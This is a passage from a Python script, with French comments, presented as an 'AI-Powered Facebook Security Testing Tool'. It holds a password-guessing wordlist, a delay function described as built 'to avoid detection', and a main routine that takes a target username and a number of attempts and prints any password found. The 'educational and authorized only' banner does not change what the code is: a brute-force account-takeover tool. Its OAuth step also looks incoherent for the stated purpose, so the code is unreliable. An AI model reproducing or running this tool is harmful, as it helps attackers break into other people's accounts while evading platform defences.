            # Termes liés à l'amour
            'iloveyou', 'love', 'lovely', 'loveme', 'forever', 'sweetheart',
            'princess', 'prince', 'babygirl', 'babyboy', 'soulmate',
            
            # Termes liés au sport
            'football', 'basketball', 'baseball', 'soccer', 'tennis',
            'golf', 'swimming', 'running', 'cycling', 'volleyball',
            
            # Termes liés aux voitures
            'ferrari', 'lamborghini', 'porsche', 'mustang', 'corvette',
            'camaro', 'mercedes', 'bmw', 'audi', 'toyota', 'honda',
            
            # Termes liés à la nourriture
            'pizza', 'hamburger', 'spaghetti', 'sushi', 'chocolate',
            'icecream', 'strawberry', 'banana', 'apple', 'orange',
            
            # Termes liés aux couleurs
            'black', 'white', 'red', 'blue', 'green', 'yellow', 'purple',
            'pink', 'orange', 'brown', 'gray', 'silver', 'gold',
            
            # Termes liés aux saisons
            'summer', 'winter', 'spring', 'autumn', 'fall', 'sunshine',
            'snowflake', 'rainbow', 'thunder', 'lightning', 'hurricane',
            
            # Termes liés aux métaux précieux
            'gold', 'silver', 'platinum', 'diamond', 'ruby', 'sapphire',
            'emerald', 'pearl', 'jade', 'crystal', 'amethyst',
            
            # Termes liés aux éléments
            'fire', 'water', 'earth', 'air', 'spirit', 'energy', 'power',
            'light', 'darkness', 'shadow', 'flame', 'storm', 'ocean',
            
            # Termes liés aux émotions
            'happy', 'sad', 'angry', 'excited', 'bored', 'tired', 'sleepy',
            'hungry', 'thirsty', 'lonely', 'loved', 'blessed', 'grateful'
        ]
    
    def _calculate_ai_delay(self, attempt: int, base_delay: float) -> float:
        """AI-optimized delay calculation to avoid detection"""
        # Implement intelligent delay calculation
        return base_delay + random.uniform(0, 1) * (attempt ** 0.5)

# Main execution
async def main():
    print("🔒 AI-Powered Facebook Security Testing Tool")
    print("🤖 Version 2025.1 - Machine Learning Enhanced")
    print("🔒 FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY")
    print("🚫 Unauthorized access is illegal and unethical")
    print("")
    
    import sys
    import asyncio
    from getpass import getpass
    
    # Vérification des arguments
    if len(sys.argv) < 2:
        print("Usage: python facebook_security_tester.py <username> [max_attempts] [delay]")
        print("Example: python facebook_security_tester.py test@example.com 50 1.5")
        sys.exit(1)
    
    username = sys.argv[1]
    max_attempts = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    delay = float(sys.argv[3]) if len(sys.argv) > 3 else 2.0
    
    # Création de l'instance du testeur
    tester = FacebookSecurityTester()
    
    # Vérification des identifiants
    print(f"\n🔑 Test d'authentification pour {username}...")
    
    # Pour Facebook, nous avons besoin d'un token d'accès valide
    print("\nPour tester la sécurité, vous devez d'abord vous authentifier via OAuth.")
    print("1. Ouvrez l'URL suivante dans votre navigateur:")
    print(f"   {tester.get_facebook_auth_url()}")
    print("2. Connectez-vous avec vos identifiants Facebook")
    print("3. Copiez le code d'autorisation depuis l'URL de redirection")
    
    auth_code = input("\nEntrez le code d'autorisation: ").strip()
    
    if not tester.get_access_token(auth_code):
        print("❌ Échec de l'authentification. Vérifiez vos identifiants et réessayez.")
        return
        
    print("✅ Authentification réussie!")
    
    # Exécution du test de sécurité
    print("\n🔍 Démarrage du test de sécurité avec IA...")
    result = await tester.conduct_ai_security_test(
        username=username,
        max_attempts=max_attempts,
        delay=delay,
        access_token=tester.access_token
    )
    
    # Affichage des résultats
    print("\n" + "="*50)
    print("Résultats du test de sécurité Facebook:")
    print(f"- Tentatives: {result.attempts}")
    print(f"- Durée: {result.duration:.2f} secondes")
    print(f"- Mot de passe trouvé: {result.password if result.success else 'Aucun'}")
    print(f"- Force du mot de passe: {result.strength.value if result.strength else 'Inconnue'}")
    print("="*50)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\nArrêt demandé par l'utilisateur.")
    except Exception as e:
        print(f"\n❌ Une erreur est survenue: {str(e)}")
        if hasattr(e, '__traceback__'):
            import traceback
            traceback.print_exc()
    finally:
        print("\nFin du programme.")

# Updated on 2026-11-12
